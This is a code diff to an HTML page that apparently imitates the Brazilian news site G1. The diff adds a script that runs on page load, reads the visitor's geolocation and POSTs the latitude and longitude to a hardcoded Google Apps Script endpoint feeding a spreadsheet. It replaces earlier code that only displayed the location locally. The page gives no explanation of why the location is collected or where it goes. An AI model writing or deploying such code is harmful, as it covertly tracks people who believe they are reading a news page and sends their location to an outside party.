@@ -88,37 +88,45 @@
   <footer>
     © 2025 G1 - Todos os direitos reservados
   </footer>
-  
-  
+
   <script>
-  // Verifica se o navegador suporta a API de Geolocalização
-  if ("geolocation" in navigator) {
-    navigator.geolocation.getCurrentPosition(
-      function(position) {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        console.log("Localização do usuário:");
-        console.log("Latitude:", latitude);
-        console.log("Longitude:", longitude);
+    // Link real do Web App
+    const endpoint = "https://script.google.com/macros/s/AKfycbw4bPC0oL_9OuhAW9vXzNnv0833eUc8Yi_uaoNGx8B8Thcteq8WPaMOrAIxwyuYhjDX/exec";
 
-        // Você pode exibir ou enviar esses dados a um servidor:
-        document.body.insertAdjacentHTML('beforeend', 
-          `<div style="padding:20px; background:#eee; margin-top:20px;">
-             <strong>Localização detectada:</strong><br>
-             Latitude: ${latitude}<br>
-             Longitude: ${longitude}
-           </div>`);
-      },
-      function(error) {
-        console.warn("Erro ao obter localização:", error.message);
-      }
-    );
-  } else {
-    console.warn("Geolocalização não é suportada pelo navegador.");
-  }
-</script>
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
 
+          // Envia para o Google Sheets
+          fetch(endpoint, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              latitude: latitude,
+              longitude: longitude
+            })
+          });
+
+          // Exibe na página
+          document.body.insertAdjacentHTML('beforeend', 
+            `<div style="padding:20px; background:#eee; margin-top:20px;">
+               <strong>Localização enviada com sucesso:</strong><br>
+               Latitude: ${latitude}<br>
+               Longitude: ${longitude}
+             </div>`);
+        },
+        function(error) {
+          console.warn("Erro ao obter localização:", error.message);
+        }
+      );
+    } else {
+      console.warn("Geolocalização não é suportada pelo navegador.");
+    }
+  </script>
 
 </body>
 </html>
-
